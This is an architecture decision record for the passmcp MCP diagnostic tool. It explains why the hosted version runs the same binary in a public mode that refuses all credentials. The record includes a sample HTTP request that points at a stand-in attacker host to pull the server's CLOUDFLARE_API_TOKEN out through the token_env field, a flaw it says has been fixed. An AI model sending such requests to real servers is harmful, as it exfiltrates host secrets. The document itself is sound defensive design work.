---
# SPDX-FileCopyrightText: 2026 Sebastien Rousseau <sebastian.rousseau@gmail.com>
# SPDX-License-Identifier: GPL-3.0-only
description: >-
  Why the hosted diagnostic on satellion.com is the same binary as the CLI, and why it accepts no credentials at all.
---

# 0005 — The hosted diagnostic is the same binary, and it accepts no credentials

**Status:** Accepted · **Date:** 2026-09-16

## Context

satellion.com should let someone run a real diagnostic against a real MCP
server without installing anything. Every way of doing that has a cost,
and two of them contradict the argument passmcp is built on.

A hosted tester that accepts credentials is the thing passmcp's own front
page warns about: handing a working token to somebody else's server. A
reimplementation for the edge — a Worker, a browser build — is a second
diagnostic that agrees with the first only until the next release, which
makes the demo a liability rather than a proof.

There is also a concrete finding. `CredSpec.Token` carries `json:"-"` and
cannot arrive in a request, but `CredSpec.TokenEnv` is ordinary JSON and
resolves through `os.LookupEnv` against the serving process. On a laptop
that is harmless: `passmcp serve` binds loopback behind a per-process token,
so the only caller already owns the environment. Answering the open
internet turns the same field into an arbitrary read of the host's
secrets, delivered as a bearer token to whichever endpoint the same
request named:

```http
POST /api/runs
{"target":{"endpoint":"https://attacker.example/mcp"},
 "credentials":{"token_env":"CLOUDFLARE_API_TOKEN"}}
```

This was demonstrated before it was fixed. With the guard removed, the
target receives `Authorization: Bearer <the host's variable>`, verbatim.

## Decision

The hosted diagnostic is `passmcp serve --public`: the same binary, from the
same release, in a different posture.

- **Credentials are constructed, not sanitised.** Public mode discards
  whatever `CredSpec` arrived and replaces it with an explicit absence. A
  request that set any credential field is refused by name rather than
  quietly stripped, because a caller who believes their token was used
  would otherwise misread the result as a test of an authenticated server.
- **The refusal walks the struct.** `credentialFieldsSet` reflects over
  `CredSpec` instead of testing known field names, so a credential field
  added later is refused by default. A list would have to be remembered,
  and the cost of forgetting is a hosted credential leak.
- **Targets come from an allowlist the server was started with.** Not a
  parameter, not a header: a field a client can set is a field a client
  can unset. An empty or missing allowlist refuses to start, so a
  misplaced path cannot read as permission to scan anything.
- **The insecure overrides are refused rather than ignored.**
  `--insecure-allow-private-hosts`, `--insecure-allow-http-auth` and
  `--allow-resource-mismatch` cannot be combined with `--public`. A flag
  that appears to work and does nothing is worse than one that fails.
- **No token is required.** A public deployment exists to be used by
  people who were never handed one. Origin validation still applies, and
  a caller's reach is bounded by the allowlist and the rate limiter rather
  than by knowing a secret.

## Consequences

The demo cannot show something the tool does not do. `cmd/parity_test.go`
already fails the build when a run flag has no `RunSpec` field, so the CLI,
TUI and web surfaces cannot drift; running the hosted surface as the same
binary extends that to the demo for free.

`--public` is deliberately **not** a run flag, and the parity gate
correctly ignores it. It configures the server, not a run. Were it a run
parameter it would be expressible in a `RunSpec`, and therefore settable
by the caller it exists to constrain.

Someone who does not trust the hosted runner can run the identical image
themselves and compare. That is only worth offering because the two are
the same artefact.

The cost is that the hosted diagnostic cannot test a server that needs a
credential. That is not a limitation to be worked around later: it is the
product's argument, and the answer stays "run it locally — it is the same
binary".
